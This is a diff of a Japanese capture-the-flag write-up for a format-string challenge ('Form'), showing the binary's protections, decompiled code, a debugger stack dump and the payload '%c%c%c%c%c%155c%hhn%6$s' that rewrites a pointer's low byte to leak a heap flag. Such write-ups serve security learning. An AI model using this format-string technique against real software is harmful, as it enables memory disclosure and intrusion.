@@ -1,6 +1,6 @@
 このwriteupはこちら[https://hackmd.io/@yqroo/ictf2023#Form]を参考にしました。
 
-,,,
+```
 $ file vuln
 vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, [略], not stripped
 
@@ -10,11 +10,11 @@ RELRO:    Full RELRO
 Stack:    No canary found
 NX:       NX enabled
 PIE:      PIE enabled
-,,,
+```
 
 ghidraで見てみると問題文通りformat stingのエラーがある。
 
-,,,
+```
 void main(void)
 {
   size_t length;
@@ -40,13 +40,12 @@ void main(void)
                     /* WARNING: Subroutine does not return */
   _exit(0);
 }
-,,,
+```
 
-長さは24まで。exitで終了しているのでfini_arrayの書き換えで何回もとはいかない。またフラグはmallocで
-確保されているので、書き換える位置を考える必要がある。
+長さは24まで。exitで終了しているのでfini_arrayの書き換えで何回もとはいかない。またフラグはmallocで確保されているので、書き換える位置を考える必要がある。
 printf実行前のスタックとレジスタは以下の通り(思いっきり答え書いちゃってた)。
 
-,,,
+```
 $rax   : 0x0
 $rbx   : 0x0
 $rcx   : 0x007f468ae36992  →  0x5677fffff0003d48 ("H="?)
@@ -66,7 +65,7 @@ $r14   : 0x0055da3fd76d90  →  0x0055da3fd741c0  →  <__do_global_dtors_aux+0>
 $r15   : 0x007f468af93040  →  0x007f468af942e0  →  0x0055da3fd73000  →   jg 0x55da3fd73047
 $eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
-───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+───── stack ────
 0x007ffe711a4260│+0x0000: 0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"       ← $rdx, $rsp
 0x007ffe711a4268│+0x0008: 0x007ffe711a4260  →  0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"
 0x007ffe711a4270│+0x0010: 0x0055da3ff8e300  →  0x00000000fbad2488
@@ -76,7 +75,7 @@ gef➤  search-pattern flag{
 [+] Searching 'flag{' in memory
 [+] In '[heap]'(0x55da3ff8e000-0x55da3ffaf000), permission=rw-
   0x55da3ff8e2a0 - 0x55da3ff8e2b9  →   "flag{this_is_test_flag}\n"
-,,,
+```
 
 フラグのアドレスとformatを書き込んだアドレスは1byte分しか変わらない(mallocで確保したサイズが小さいので当然だけど)。つまりスタックにあるアドレス(64bitでいうと6番目の引数)下位1byteを0xa0に書き換えてやればいい。
 
